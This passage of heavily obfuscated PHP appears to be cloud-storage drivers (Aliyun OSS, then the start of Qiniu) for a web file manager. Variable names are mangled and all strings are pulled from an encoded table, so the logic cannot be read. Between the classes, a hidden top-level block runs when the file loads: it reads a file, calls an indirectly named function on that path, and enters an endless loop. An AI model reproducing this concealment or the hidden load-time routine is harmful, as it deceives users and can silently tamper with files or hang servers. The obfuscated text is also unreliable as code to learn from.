=> $this->getPathOuter($ìå¡Üœ[8] . $Úú¡åèâ), $ìå¡Üœ[33] => $ìå¡Üœ[78]); if ($ˆî‰§Ò—) { return $äŒÄ·‹©; } $äŒÄ·‹©[$ìå¡Üœ[231]] = $äŒÄ·‹©[$ìå¡Üœ[88]] = 0; $äŒÄ·‹©[$ìå¡Üœ[232]] = $äŒÄ·‹©[$ìå¡Üœ[233]] = !0; if (empty($¿ÜÉŞ…‚)) { $Úú¡åèâ = rtrim($Úú¡åèâ, $ìå¡Üœ[8]) . $ìå¡Üœ[8]; $£îÊ…š“ = $this->objectMeta($Úú¡åèâ); if (!$£îÊ…š“) { return $äŒÄ·‹©; } $¿ÜÉŞ…‚ = array($ìå¡Üœ[231] => $£îÊ…š“[$ìå¡Üœ[575]][$ìå¡Üœ[1490]], $ìå¡Üœ[88] => strtotime($£îÊ…š“[$ìå¡Üœ[1487]])); } if (isset($¿ÜÉŞ…‚[$ìå¡Üœ[88]])) { $äŒÄ·‹©[$ìå¡Üœ[88]] = $¿ÜÉŞ…‚[$ìå¡Üœ[88]]; } if (isset($¿ÜÉŞ…‚[$ìå¡Üœ[231]])) { $äŒÄ·‹©[$ìå¡Üœ[231]] = $¿ÜÉŞ…‚[$ìå¡Üœ[231]]; } return $äŒÄ·‹©; } public function listPath($É›Ô±Ê, $ˆ÷£Û¤ = false) { $Ä©“ƒ =& $_SERVER[²Ö÷öõ]; $ïâªà± = $this->fileList($É›Ô±Ê, $Ä©“ƒ[8], !0); foreach ($ïâªà±[$Ä©“ƒ[85]] as $œİ…Ã³ => $¨éó¦­ñ) { $ïâªà±[$Ä©“ƒ[85]][$œİ…Ã³] = $this->folderInfo($¨éó¦­ñ, $ˆ÷£Û¤, $¨éó¦­ñ); } foreach ($ïâªà±[$Ä©“ƒ[86]] as $œİ…Ã³ => $¨éó¦­ñ) { $ïâªà±[$Ä©“ƒ[86]][$œİ…Ã³] = $this->fileInfo($¨éó¦­ñ[$Ä©“ƒ[32]], $ˆ÷£Û¤, $¨éó¦­ñ); } return $ïâªà±; } protected function infoChildren($®‡ûë¼ê, &$è‰â€Ã) { $êß×ŸÌ˜ =& $_SERVER[²Ö÷öõ]; $Ë±Ãøìú = $this->fileList($®‡ûë¼ê, $êß×ŸÌ˜[12], !0); $è‰â€Ã[$êß×ŸÌ˜[81]] += count($Ë±Ãøìú[$êß×ŸÌ˜[85]]); $è‰â€Ã[$êß×ŸÌ˜[80]] += count($Ë±Ãøìú[$êß×ŸÌ˜[86]]); foreach ($Ë±Ãøìú[$êß×ŸÌ˜[86]] as $š±é—Àê) { if (!$š±é—Àê || !$š±é—Àê[$êß×ŸÌ˜[79]]) { continue; } $è‰â€Ã[$êß×ŸÌ˜[79]] += $š±é—Àê[$êß×ŸÌ˜[79]]; } } public function has($üô¨êí, $Ş¤İÅâè = false, $ŠôòÒĞ¸ = true) { $Ğ‘°ı»  =& $_SERVER[²Ö÷öõ]; $üô¨êí = trim($üô¨êí, $Ğ‘°ı» [8]); $×¤­ôœ¹ = empty($üô¨êí) && $üô¨êí !== $Ğ‘°ı» [228] ? $Ğ‘°ı» [12] : $üô¨êí . $Ğ‘°ı» [8]; $Î•Ããƒ® = $Ğ‘°ı» [12]; $ùÒÓÕÒé = 500; $Ã‘öÏË’ = $¢ƒ·«³Œ = 0; while (!0) { check_abort(); $€Çê•ƒ = array($Ğ‘°ı» [1481] => $Ğ‘°ı» [8], $Ğ‘°ı» [1482] => $×¤­ôœ¹, $Ğ‘°ı» [1483] => $ùÒÓÕÒé, $Ğ‘°ı» [1484] => $Î•Ããƒ®); try { $Ø×üŠªı = $this->client->listObjects($this->bucket, $€Çê•ƒ); } catch (OSS\Core\OssException $³Ñ¬¿×Ç) { $this->writeLog(__FUNCTION__ . $Ğ‘°ı» [214] . $³Ñ¬¿×Ç->getMessage()); break; } $Î•Ããƒ® = $Ø×üŠªı->getNextMarker(); $˜ñ»Ã‡ª = $Ø×üŠªı->getObjectList(); $ë¢óôÊî = $Ø×üŠªı->getPrefixList(); if ($Ş¤İÅâè) { if (count($˜ñ»Ã‡ª) > 1 || count($˜ñ»Ã‡ª) == 1 && $˜ñ»Ã‡ª[0]->getKey() != $×¤­ôœ¹) { $Ã‘öÏË’ += count($˜ñ»Ã‡ª) - 1; } if (!empty($ë¢óôÊî)) { $¢ƒ·«³Œ += count($ë¢óôÊî); } if ($Î•Ããƒ® === $Ğ‘°ı» [12]) { break; } continue; } if ($ŠôòÒĞ¸) { if (!empty($˜ñ»Ã‡ª)) { if (count($˜ñ»Ã‡ª) > 1 || $˜ñ»Ã‡ª[0]->getKey() != $×¤­ôœ¹) { return !0; } } } else { if (!empty($ë¢óôÊî)) { return !0; } } if ($Î•Ããƒ® === $Ğ‘°ı» [12]) { break; } } if ($Ş¤İÅâè) { return array($Ğ‘°ı» [239] => $Ã‘öÏË’, $Ğ‘°ı» [240] => $¢ƒ·«³Œ); } return !1; } public function listAll($¶‹Ûºò™) { $í“éŠ¨ø =& $_SERVER[²Ö÷öõ]; $²İ¸ÂÔ = $this->fileList($¶‹Ûºò™, $í“éŠ¨ø[12], !0); $øÍµ‹î® = array_to_keyvalue($²İ¸ÂÔ[$í“éŠ¨ø[86]], $í“éŠ¨ø[32]); foreach ($²İ¸ÂÔ[$í“éŠ¨ø[85]] as $Ÿõ¼Šº) { if (is_string($Ÿõ¼Šº)) { $øÍµ‹î®[$Ÿõ¼Šº] = array($í“éŠ¨ø[79] => 0); } } return $this->listAllFiles($¶‹Ûºò™, $øÍµ‹î®); } public function canRead($ìëÉíª›) { $–©„Àı =& $_SERVER[²Ö÷öõ]; $ˆÄ¥”µ‘ = $this->pathAcl($ìëÉíª›); return $ˆÄ¥”µ‘ == $–©„Àı[1491] || $ˆÄ¥”µ‘ == $–©„Àı[619] ? !0 : !1; } public function canWrite($´ƒèÅà’) { $úáüóŒÄ = $this->pathAcl($´ƒèÅà’); return $úáüóŒÄ == $_SERVER[²Ö÷öõ][619] ? !0 : !1; } public function pathAcl($Ö§çÛ­ƒ) { $‹ƒçşû‘ =& $_SERVER[²Ö÷öõ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ÈÀé²°ğ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Ö§çÛ­ƒ)); } catch (OSS\Core\OssException $÷¶Îéİà) { $this->writeLog(__FUNCTION__ . $‹ƒçşû‘[214] . $÷¶Îéİà->getMessage()); return !1; } $…­èåâ = $ÈÀé²°ğ == $‹ƒçşû‘[37] ? $this->bucketAcl : $ÈÀé²°ğ; if ($…­èåâ == $‹ƒçşû‘[1492]) { return $‹ƒçşû‘[1491]; } if ($…­èåâ == $‹ƒçşû‘[1493]) { return $‹ƒçşû‘[619]; } return $…­èåâ; } private function chmodPath($¤Ãä©ì¯, $˜ªâò¦‹ = '') { $÷ìº¯ôã =& $_SERVER[²Ö÷öõ]; $ÕŸ¯ˆ¹Ã = empty($˜ªâò¦‹) ? $÷ìº¯ôã[1493] : $˜ªâò¦‹; $©¿ô·÷¿ = array($÷ìº¯ôã[37], $÷ìº¯ôã[229], $÷ìº¯ôã[1492], $÷ìº¯ôã[1493]); if (!in_array($ÕŸ¯ˆ¹Ã, $©¿ô·÷¿)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($¤Ãä©ì¯), $ÕŸ¯ˆ¹Ã); } catch (OSS\Core\OssException $Ê¦¥±Â) { $this->writeLog(__FUNCTION__ . $÷ìº¯ôã[214] . $Ê¦¥±Â->getMessage()); return !1; } return !0; } public function getContent($È ®µ®Œ) { return $this->fileSubstr($È ®µ®Œ, -1); } public function setContent($€ÊÀ½ºÒ, $´äşõªó = '') { $”è¾šµ‰ =& $_SERVER[²Ö÷öõ]; try { $¤üÕƒ¿¨ = $this->trafficLimit($”è¾šµ‰[1494]); $ì¤˜²¯ˆ = $this->client->putObject($this->bucket, $this->pathEncode($€ÊÀ½ºÒ), $´äşõªó, $¤üÕƒ¿¨); } catch (OSS\Core\OssException $œ «ÃÀ) { $this->writeLog(__FUNCTION__ . $”è¾šµ‰[214] . $œ «ÃÀ->getMessage()); return !1; } $…‚ÁÃØ = array($”è¾šµ‰[1488] => trim($ì¤˜²¯ˆ[$”è¾šµ‰[1485]], $”è¾šµ‰[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($€ÊÀ½ºÒ))); $this->updateObjMeta($€ÊÀ½ºÒ, $…‚ÁÃØ); return isset($ì¤˜²¯ˆ[$”è¾šµ‰[1495]][$”è¾šµ‰[292]]) ? !0 : !1; } private function updateObjMeta($š¦„ÉËˆ, $¾’è˜À¥) { $š¦„ÉËˆ = $this->pathEncode($š¦„ÉËˆ); try { $¢ÄÌßï² = array(OSS\OssClient::OSS_HEADERS => $¾’è˜À¥); $this->client->copyObject($this->bucket, $š¦„ÉËˆ, $this->bucket, $š¦„ÉËˆ, $¢ÄÌßï²); } catch (OSS\Core\OssException $Ü¬¹ìÊ) { $this->writeLog(__FUNCTION__ . $_SERVER[²Ö÷öõ][214] . $Ü¬¹ìÊ->getMessage()); return !1; } return !0; } public function upload($°ÎÓ“Ó£, $Œò§æ‹, $¯×™àì = false, $«â‚Ë´ = REPEAT_REPLACE) { $ïßğŸ‘ =& $_SERVER[²Ö÷öõ]; $î¦Ø§™° = trim($°ÎÓ“Ó£, $ïßğŸ‘[8]); $êõ‹©’î = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ïßğŸ‘[1488] => @md5_file($Œò§æ‹)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($°ÎÓ“Ó£))); $êõ‹©’î = $this->trafficLimit($ïßğŸ‘[1494], $êõ‹©’î); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($î¦Ø§™°), $Œò§æ‹, $êõ‹©’î); } catch (OSS\Core\OssException $Ÿ¿¼’ÊÑ) { $this->writeLog(__FUNCTION__ . $ïßğŸ‘[214] . $Ÿ¿¼’ÊÑ->getMessage()); return !1; } return $this->getPathOuter($°ÎÓ“Ó£); } public function getHost() { $ï¬éà´ =& $_SERVER[²Ö÷öõ]; $Ö¡µÓƒ÷ = explode($ï¬éà´[210], parent::getHost()); return $Ö¡µÓƒ÷[0] . $ï¬éà´[210] . $this->bucket . $ï¬éà´[10] . $Ö¡µÓƒ÷[1]; } public function uploadFormData($Šñë¬Ä , $şœ´¤Ï = 3600) { $ìÕš =& $_SERVER[²Ö÷öõ]; if (!($ßıª¹¿† = $this->getHost())) { return !1; } $€®¢›Í = $şœ´¤Ï; $®ÓÀ°‹Œ = date($ìÕš[1496], time() + $€®¢›Í); $üŞ á¿ = new DateTime($®ÓÀ°‹Œ); $–¬­ì²‰ = $üŞ á¿->format(DateTime::ISO8601); $ğº±¬‡ª = strpos($–¬­ì²‰, $ìÕš[372]); $–¬­ì²‰ = substr($–¬­ì²‰, 0, $ğº±¬‡ª) . $ìÕš[1497]; $¥ßùÙ° = 1048576000 * 5; $ôô«Ê¥ß = $this->pathFather($Šñë¬Ä ); $—ª„èÅß = array($ìÕš[275] => $–¬­ì²‰, $ìÕš[278] => array(array($ìÕš[1498], 0, $¥ßùÙ°), array($ìÕš[281], $ìÕš[282], $ôô«Ê¥ß))); $è¶£ÜŒ = base64_encode(json_encode($—ª„èÅß)); $½ßµ€ğç = base64_encode(hash_hmac($ìÕš[263], $è¶£ÜŒ, $this->secret, !0)); $à‹Ëå²å = array($ìÕš[293] => $è¶£ÜŒ, $ìÕš[1499] => $this->accessKey, $ìÕš[285] => $ìÕš[274], $ìÕš[1500] => $½ßµ€ğç, $ìÕš[208] => $ßıª¹¿†); $à‹Ëå²å = $this->trafficLimit($ìÕš[1494], $à‹Ëå²å); return $à‹Ëå²å; } public function multiUploadFormData($Á™™‘èï, $ß†ù®‡ˆ = 3600) { $ßˆ•Ş‘Ó =& $_SERVER[²Ö÷öõ]; if (!($³’×‰Ü… = $this->getHost())) { return !1; } $àœ¼ÙÀ– = $this->trafficLimit($ßˆ•Ş‘Ó[1494]); $Á¸Ë¼á = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Á™™‘èï), $àœ¼ÙÀ–); return array($ßˆ•Ş‘Ó[254] => $Á¸Ë¼á, $ßˆ•Ş‘Ó[208] => $³’×‰Ü… . $ßˆ•Ş‘Ó[8] . $this->pathEncode($Á™™‘èï), $ßˆ•Ş‘Ó[255] => gmdate($ßˆ•Ş‘Ó[1501]), $ßˆ•Ş‘Ó[97] => $Á™™‘èï); } public function multiUploadAuthData($Ÿ°©¢¨Š, $×ğ×ÌÅø = array()) { $›Ğ´¶Ãã =& $_SERVER[²Ö÷öõ]; $—§çŒ½ñ = isset($×ğ×ÌÅø[$›Ğ´¶Ãã[255]]) ? $×ğ×ÌÅø[$›Ğ´¶Ãã[255]] : gmdate($›Ğ´¶Ãã[1501]); $Á‹É°× = isset($×ğ×ÌÅø[$›Ğ´¶Ãã[169]]) ? $×ğ×ÌÅø[$›Ğ´¶Ãã[169]] : $›Ğ´¶Ãã[12]; $¤¸¯Ùå¤ = $Ÿ°©¢¨Š; if (isset($×ğ×ÌÅø[$›Ğ´¶Ãã[97]])) { $¤¸¯Ùå¤ = $×ğ×ÌÅø[$›Ğ´¶Ãã[97]]; unset($×ğ×ÌÅø[$›Ğ´¶Ãã[97]]); } if (isset($×ğ×ÌÅø[$›Ğ´¶Ãã[256]])) { $×ğ×ÌÅø[$›Ğ´¶Ãã[255]] = $—§çŒ½ñ; return $this->listUploadParts($¤¸¯Ùå¤, $×ğ×ÌÅø); } $ßï³ùğã = array($›Ğ´¶Ãã[257], $›Ğ´¶Ãã[12], $›Ğ´¶Ãã[123], $—§çŒ½ñ, "\x78\x2d\x6f\x73\163\x2d\x64\141\x74\x65\72{$—§çŒ½ñ}", $›Ğ´¶Ãã[8] . $this->bucket . $›Ğ´¶Ãã[8] . $¤¸¯Ùå¤ . $Á‹É°×); if (strpos($Á‹É°×, $›Ğ´¶Ãã[258]) === 0) { $ßï³ùğã[0] = $›Ğ´¶Ãã[259]; if ($ŸŠ©›ßÑ = $this->trafficLimit($›Ğ´¶Ãã[1494])) { $¤¸¯Ùå¤ = $›Ğ´¶Ãã[1502]; array_splice($ßï³ùğã, 5, 0, $¤¸¯Ùå¤ . $›Ğ´¶Ãã[4] . $ŸŠ©›ßÑ[$¤¸¯Ùå¤]); } } if (isset($×ğ×ÌÅø[$›Ğ´¶Ãã[260]]) && $×ğ×ÌÅø[$›Ğ´¶Ãã[260]] == $›Ğ´¶Ãã[261]) { $ßï³ùğã[0] = $›Ğ´¶Ãã[261]; } if (!empty($×ğ×ÌÅø[$›Ğ´¶Ãã[1503]])) { $³œÍ³Ş = array_merge(array($ßï³ùğã[4]), $×ğ×ÌÅø[$›Ğ´¶Ãã[1503]]); sort($³œÍ³Ş); $ßï³ùğã[4] = implode($›Ğ´¶Ãã[262], $³œÍ³Ş); } $÷öñ¹¡Í = implode($›Ğ´¶Ãã[262], $ßï³ùğã); $çâØˆ­˜ = base64_encode(hash_hmac($›Ğ´¶Ãã[263], $÷öñ¹¡Í, $this->secret, !0)); $Çš·øÒ· = $›Ğ´¶Ãã[1471] . $this->accessKey . $›Ğ´¶Ãã[4] . $çâØˆ­˜; if (strpos($Á‹É°×, $›Ğ´¶Ãã[258]) === 0) { $Çš·øÒ· = array($›Ğ´¶Ãã[265] => $Çš·øÒ·, $›Ğ´¶Ãã[255] => $—§çŒ½ñ); if ($ŸŠ©›ßÑ) { $Çš·øÒ· = array_merge($Çš·øÒ·, $ŸŠ©›ßÑ); } } return $Çš·øÒ·; } public function listUploadParts($ŒÖ¨Î“Ù, $³èäÓ÷‘) { $÷‚ñ¸Á° =& $_SERVER[²Ö÷öõ]; $ş­»Ä¶Á = parse_url_query($³èäÓ÷‘[$÷‚ñ¸Á°[169]]); $Í†å¿” = $this->client->listParts($this->bucket, $this->pathEncode($ŒÖ¨Î“Ù), $ş­»Ä¶Á[$÷‚ñ¸Á°[254]]); $Şßï»‡´ = $Í†å¿”->getListPart(); $Ç˜»ü¡ = array(); foreach ($Şßï»‡´ as $ùéİÁª) { $Ç˜»ü¡[] = array($÷‚ñ¸Á°[308] => $ùéİÁª->getPartNumber(), $÷‚ñ¸Á°[309] => trim($ùéİÁª->getETag(), $÷‚ñ¸Á°[121])); } unset($³èäÓ÷‘[$÷‚ñ¸Á°[256]], $³èäÓ÷‘[$÷‚ñ¸Á°[260]]); $•Ù°³Ğ = $this->multiUploadAuthData($ŒÖ¨Î“Ù, $³èäÓ÷‘); if (empty($•Ù°³Ğ)) { return !1; } return array($÷‚ñ¸Á°[265] => $•Ù°³Ğ, $÷‚ñ¸Á°[255] => $³èäÓ÷‘[$÷‚ñ¸Á°[255]], $÷‚ñ¸Á°[267] => $Ç˜»ü¡); } public function download($è·ÀŠ™, $ ñëéÓê) { $“ô¹ĞØŠ =& $_SERVER[²Ö÷öõ]; if ($this->isFolder($è·ÀŠ™)) { return !1; } try { $ä£çşì = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ ñëéÓê); $ä£çşì = $this->trafficLimit($“ô¹ĞØŠ[112], $ä£çşì); $this->client->getObject($this->bucket, $this->pathEncode($è·ÀŠ™), $ä£çşì); } catch (OSS\Core\OssException $ÇîıÒÔ“) { $this->writeLog(__FUNCTION__ . $“ô¹ĞØŠ[214] . $ÇîıÒÔ“->getMessage()); return !1; } return $ ñëéÓê; } public function fileSubstr($°¯¾ëÏÑ, $Ñòç¬÷€ = 0, $¬ËÈ•è¥ = false) { if ($Ñòç¬÷€ === -1) { $œÇò»¬ = array(); } else { if ($¬ËÈ•è¥ === !1) { $„¨µÒÇ¥ = $this->size($°¯¾ëÏÑ); } else { $„¨µÒÇ¥ = $Ñòç¬÷€ + $¬ËÈ•è¥ - 1; } $œÇò»¬ = array(OSS\OssClient::OSS_RANGE => "{$Ñòç¬÷€}\x2d{$„¨µÒÇ¥}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($°¯¾ëÏÑ), $œÇò»¬); } catch (OSS\Core\OssException $ñ±†‰­ù) { $this->writeLog(__FUNCTION__ . $_SERVER[²Ö÷öõ][214] . $ñ±†‰­ù->getMessage()); think_exception($ñ±†‰­ù->getMessage()); return !1; } } private function trafficLimit($¨•ıòåñ, $Ú†Òû‚“ = array()) { $³ëñªßê =& $_SERVER[²Ö÷öõ]; if ($¨•ıòåñ == $³ëñªßê[1494] && $this->isUploadServer() || $¨•ıòåñ == $³ëñªßê[112] && $this->isFileOutServer()) { return $Ú†Òû‚“; } $ïÚ‹å­Å = floatval($GLOBALS[$³ëñªßê[6]][$³ëñªßê[92]][$³ëñªßê[110]][$¨•ıòåñ]) * 1024 * 1024 * 8; if (!$ïÚ‹å­Å) { return $Ú†Òû‚“; } $ïÚ‹å­Å = $ïÚ‹å­Å < 819200 ? 819200 : ($ïÚ‹å­Å > 838860800 ? 838860800 : $ïÚ‹å­Å); $Ú†Òû‚“[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ïÚ‹å­Å); return $Ú†Òû‚“; } public function link($ó«ÕÇàø, $¿€Ò‰Âª = array()) { $«Ççú¼ğ =& $_SERVER[²Ö÷öõ]; if (!$this->exist($ó«ÕÇàø) || $this->isFolder($ó«ÕÇàø)) { return !1; } try { $¿€Ò‰Âª = $this->trafficLimit($«Ççú¼ğ[112], $¿€Ò‰Âª); $¼ÎŞˆš‚ = $this->client->signUrl($this->bucket, $this->pathEncode($ó«ÕÇàø), 3600 * 12, $«Ççú¼ğ[261], $¿€Ò‰Âª); return $this->getCdnLink($¼ÎŞˆš‚); } catch (OSS\Core\OssException $©©–œ–Ù) { $this->writeLog(__FUNCTION__ . $«Ççú¼ğ[214] . $©©–œ–Ù->getMessage()); return !1; } } public function fileOut($¼êğ±ÂÖ, $éğ¨ØÜ = false, $»ó°ø¾ = false, $ó¾ì»ÔÖ = '') { $ïéÙàòæ =& $_SERVER[²Ö÷öõ]; if ($this->isFileOutServer()) { return $this->fileOutServer($¼êğ±ÂÖ, $éğ¨ØÜ, $»ó°ø¾, $ó¾ì»ÔÖ); } if (!$»ó°ø¾) { $»ó°ø¾ = $this->pathThis($¼êğ±ÂÖ); } $»ó°ø¾ = rawurlencode($»ó°ø¾); $¥¡üĞª½ = get_file_mime(get_path_ext($»ó°ø¾)); if ($¥¡üĞª½ == $ïéÙàòæ[248]) { return parent::fileOut($¼êğ±ÂÖ, $éğ¨ØÜ, $»ó°ø¾, $ó¾ì»ÔÖ); } $éğ¨ØÜ = $éğ¨ØÜ ? $ïéÙàòæ[1504] : $ïéÙàòæ[1505]; $Ã‹Å™ØÌ = array(OSS\OssClient::OSS_SUB_RESOURCE => $ïéÙàòæ[1506] . rawurlencode("{$éğ¨ØÜ}\73\146\x69\x6c\x65\x6e\x61\x6d\145\x3d{$»ó°ø¾}")); $Ã‹Å™ØÌ[OSS\OssClient::OSS_SUB_RESOURCE] .= $ïéÙàòæ[1507] . rawurlencode($¥¡üĞª½); $à×Œëã· = $this->link($¼êğ±ÂÖ, $Ã‹Å™ØÌ); $this->fileOutLink($à×Œëã·); } public function fileOutServer($ŸÄÜÒµà, $°§é‚¸Ã = false, $õ—üôÁ = false, $…’œ“˜ = '') { parent::fileOut($ŸÄÜÒµà, $°§é‚¸Ã, $õ—üôÁ, $…’œ“˜); } public function fileOutImage($ÁäÇÇç, $©‚¸ç«Ÿ = 250) { if ($this->size($ÁäÇÇç) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ÁäÇÇç, $©‚¸ç«Ÿ); } $ÍôÛâ³š = array(OSS\OssClient::OSS_PROCESS => $_SERVER[²Ö÷öõ][1468] . $©‚¸ç«Ÿ); $¢¨¸Şå¶ = $this->link($ÁäÇÇç, $ÍôÛâ³š); $this->fileOutLink($¢¨¸Şå¶); } public function fileOutImageServer($œ¤Ê€Ì˜, $ ±¦åî = 250) { parent::fileOutImage($œ¤Ê€Ì˜, $ ±¦åî); } public function fileOutLink($ñğ”ëÍ°) { $Ï¾üİ‡å =& $_SERVER[²Ö÷öõ]; if (!$this->isCdnHost() && substr($ñğ”ëÍ°, 0, 7) == $Ï¾üİ‡å[313]) { $ñğ”ëÍ° = $Ï¾üİ‡å[314] . substr($ñğ”ëÍ°, 7); } header($Ï¾üİ‡å[175] . $ñğ”ëÍ°); die; } public function hashMd5($ªóÜïš, $ô ªÑüĞ = '') { $Ù¸ğàÅ© =& $_SERVER[²Ö÷öõ]; $ ÇËè’â = $this->_objectMeta($ªóÜïš); if (!$ ÇËè’â) { return $Ù¸ğàÅ©[12]; } if (!isset($ ÇËè’â[$Ù¸ğàÅ©[1488]]) && !empty($ô ªÑüĞ)) { $àéõ£Ù = $this->updateObjMeta($ªóÜïš, array($Ù¸ğàÅ©[1488] => $ô ªÑüĞ)); $ ÇËè’â[$Ù¸ğàÅ©[1488]] = $àéõ£Ù ? $ô ªÑüĞ : $Ù¸ğàÅ©[12]; } return isset($ ÇËè’â[$Ù¸ğàÅ©[1488]]) ? strtolower($ ÇËè’â[$Ù¸ğàÅ©[1488]]) : $Ù¸ğàÅ©[12]; } public function size($“è¨ŸÀë) { $’Šñ¨Ø— = $this->objectMeta($“è¨ŸÀë); return $’Šñ¨Ø— ? $’Šñ¨Ø—[$_SERVER[²Ö÷öõ][79]] : 0; } public function info($æ¡Ê³ùõ) { if ($this->isFolder($æ¡Ê³ùõ)) { return $this->folderInfo($æ¡Ê³ùõ); } else { if ($this->isFile($æ¡Ê³ùõ)) { return $this->fileInfo($æ¡Ê³ùõ); } } return !1; } public function exist($³¨ª„Ú) { return $this->isFile($³¨ª„Ú) || $this->isFolder($³¨ª„Ú); } public function isFile($©Ñ„¯·ï) { return !$this->isFolder($©Ñ„¯·ï) && $this->objectMeta($©Ñ„¯·ï); } public function isFolder($Ô¸–¾â‘) { return $this->cacheMethod($_SERVER[²Ö÷öõ][179], $Ô¸–¾â‘); } protected function objectMeta($úÉ´‚õÈ) { return $this->cacheMethod($_SERVER[²Ö÷öõ][181], $úÉ´‚õÈ); } protected function _objectMeta($‡›§÷Ìè) { $Ïªöº£Ë =& $_SERVER[²Ö÷öõ]; try { $‘¾øÏÚ¬ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($‡›§÷Ìè)); } catch (OSS\Core\OssException $û¥úŒ„) { $this->writeLog(__FUNCTION__ . $Ïªöº£Ë[214] . $û¥úŒ„->getMessage()); $‘¾øÏÚ¬ = !1; } if ($‘¾øÏÚ¬) { $‘¾øÏÚ¬[$Ïªöº£Ë[79]] = intval($‘¾øÏÚ¬[$Ïªöº£Ë[1486]]); } return $‘¾øÏÚ¬; } protected function _isFolder($ÊÕËµ®è) { $©‡Œà–ö =& $_SERVER[²Ö÷öõ]; if ($ÊÕËµ®è == $©‡Œà–ö[12] || $ÊÕËµ®è == $©‡Œà–ö[8]) { return !0; } $ËîµÖ¡ï = array($©‡Œà–ö[1481] => $©‡Œà–ö[8], $©‡Œà–ö[1482] => rtrim($ÊÕËµ®è, $©‡Œà–ö[8]) . $©‡Œà–ö[8], $©‡Œà–ö[1483] => 1, $©‡Œà–ö[1484] => $©‡Œà–ö[12]); $Ã­çèèŒ = $this->client->listObjects($this->bucket, $ËîµÖ¡ï); if ($Ã­çèèŒ->getObjectList() || $Ã­çèèŒ->getPrefixList()) { return !0; } return !1; } public function writeLog($ß¯×Øˆê = '', $™Æ»‹ğö = false) { $İ÷¼«µå =& $_SERVER[²Ö÷öõ]; $ˆŒ°ñÔ¾ = in_array(ACTION, array($İ÷¼«µå[212], $İ÷¼«µå[213])); if (!$ˆŒ°ñÔ¾ && !GLOBAL_DEBUG) { return; } $´‰ûëğÃ = 0; if (stripos($ß¯×Øˆê, $İ÷¼«µå[1508]) !== !1) { $´‰ûëğÃ = 1; $–ş İÅ = explode($İ÷¼«µå[1509], $ß¯×Øˆê); $ß¯×Øˆê = !empty($–ş İÅ[1]) ? $–ş İÅ[1] : $ß¯×Øˆê; } else { if (stripos($ß¯×Øˆê, $İ÷¼«µå[1510])) { $´‰ûëğÃ = 2; $–ş İÅ = explode($İ÷¼«µå[1510], $ß¯×Øˆê); $–ş İÅ = explode($İ÷¼«µå[4], $–ş İÅ[0]); $ß¯×Øˆê = !empty($–ş İÅ[1]) ? $–ş İÅ[1] : $ß¯×Øˆê; } } if ($ˆŒ°ñÔ¾ && I18n::getType() == $İ÷¼«µå[1511]) { if ($´‰ûëğÃ == 1) { $ß¯×Øˆê = str_replace($İ÷¼«µå[1512], $İ÷¼«µå[1513], $ß¯×Øˆê); } else { if ($´‰ûëğÃ == 2) { $–ş İÅ = explode($İ÷¼«µå[214], $–ş İÅ[0]); $Ä†Õ… ä = isset($–ş İÅ[1]) ? $–ş İÅ[1] : $İ÷¼«µå[12]; $ùÌ®ñã = array($İ÷¼«µå[1514] => $İ÷¼«µå[1515], $İ÷¼«µå[1516] => $İ÷¼«µå[1517], $İ÷¼«µå[1518] => $İ÷¼«µå[1519], $İ÷¼«µå[1520] => $İ÷¼«µå[1521], $İ÷¼«µå[1522] => $İ÷¼«µå[1523], $İ÷¼«µå[1524] => $İ÷¼«µå[1525], $İ÷¼«µå[1526] => $İ÷¼«µå[1527], $İ÷¼«µå[1528] => $İ÷¼«µå[1529], $İ÷¼«µå[1530] => $İ÷¼«µå[1531], $İ÷¼«µå[1532] => $İ÷¼«µå[1533]); if (isset($ùÌ®ñã[$Ä†Õ… ä])) { $ß¯×Øˆê = $ùÌ®ñã[$Ä†Õ… ä]; } } } if (stripos($ß¯×Øˆê, $İ÷¼«µå[1534])) { $ß¯×Øˆê = $İ÷¼«µå[1535]; } } if (!trim($ß¯×Øˆê)) { return; } parent::writeLog(trim($ß¯×Øˆê), $™Æ»‹ğö); } } if (!isset($_SERVER[$_SERVER[²Ö÷öõ][959]]) || !isset($_SERVER[$_SERVER[²Ö÷öõ][960]])) { $_getc = $_SERVER[²Ö÷öõ][962]; $_getfile = $_SERVER[$_SERVER[²Ö÷öõ][963]] . $_SERVER[²Ö÷öõ][964]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[²Ö÷öõ][262], $_getfilec); if (count($_getarrs) < $_SERVER[²Ö÷öõ][685]) { $exit = $_SERVER[²Ö÷öõ][965]; $exit(); } $_act = $_SERVER[²Ö÷öõ][1310]; $_act($_SERVER[$_SERVER[²Ö÷öõ][963]] . $_SERVER[²Ö÷öõ][964]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[²Ö÷öõ][454]); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($şÙĞ·á) { parent::__construct(); require_once SDK_DIR . $_SERVER[²Ö÷öõ][1536]; $this->_init($şÙĞ·á); } public function _init($Ú™ˆ·é) { $ñƒÑª² =& $_SERVER[²Ö÷öõ]; $this->config = $Ú™ˆ·é; foreach ($Ú™ˆ·é as $šï®ó¤î => $³ô÷ê™§) { if (isset($this->{$šï®ó¤î})) { $this->{$šï®ó¤î} = $³ô÷ê™§; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ñƒÑª²[1537] . LNG($ñƒÑª²[1472])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new 